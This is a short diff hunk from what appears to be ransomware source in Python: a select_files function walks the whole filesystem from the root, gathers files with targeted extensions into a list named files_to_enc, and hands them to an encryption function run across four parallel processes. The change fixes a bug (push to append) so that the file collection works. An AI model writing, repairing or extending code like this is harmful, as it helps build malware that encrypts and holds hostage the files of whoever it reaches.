@@ -106,7 +106,7 @@ def select_files():
     for root, dirs, files in os.walk("/"):
         for file in files:
             if file.endswith(tuple(ext)):
-                files_to_enc.push(os.path.join(root, file))
+                files_to_enc.append(os.path.join(root, file))
 
     # Parallelize execution of encryption function over four subprocesses
     pool = Pool(processes=4)
